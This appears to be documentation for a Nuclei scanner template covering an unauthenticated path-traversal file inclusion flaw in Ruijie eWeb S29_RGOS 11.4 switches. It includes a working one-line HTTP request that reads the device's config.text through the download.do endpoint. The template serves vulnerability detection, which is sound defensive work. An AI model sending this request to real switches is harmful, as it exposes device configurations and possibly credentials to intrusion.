# Nuclei Template: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Local File Inclusion
**Template ID:** ruijie-networks-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`ruijie-networks-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Ruijie Networks Switch eWeb S29_RGOS 11.4 is vulnerable to local file inclusion and allows remote unauthenticated attackers to access locally stored files and retrieve their content via the 'download.do' endpoint.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/download.do?file=../../../../config.text
```

## References
- https://exploit-db.com/exploits/48755
